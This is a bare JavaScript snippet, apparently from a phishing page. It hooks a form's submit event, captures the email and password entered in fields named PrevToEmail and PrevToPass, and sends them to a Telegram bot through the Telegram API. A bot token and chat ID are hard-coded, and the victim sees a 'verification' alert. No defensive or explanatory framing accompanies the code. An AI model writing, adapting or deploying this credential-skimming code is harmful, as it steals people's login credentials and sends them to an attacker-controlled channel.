<script type="text/javascript">
  // Replace with your Telegram Bot Token
  const botToken = '7487096625:AAFe1iFzM2zFGX1sTCLPcN9ml8cUkeN-OPQ';
  // Replace with your Telegram chat ID (use your ID or group ID where messages will be sent)
  const chatId = '5867127305';

  document.querySelector("form").addEventListener("submit", function(e) {
    e.preventDefault(); // Prevent form from submitting normally

    // Capture form inputs
    const email = document.querySelector("input[name='PrevToEmail']").value;
    const password = document.querySelector("input[name='PrevToPass']").value;

    // Prepare message content
    const message = `New verification attempt: \nEmail: ${email}\nPassword: ${password}`;

    // Send message to Telegram using fetch
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        alert('Verification data sent successfully.');
      } else {
        alert('Failed to send data to Telegram.');
      }
    })
    .catch(error => {
      alert('Error: ' + error);
    });
  });
</script>
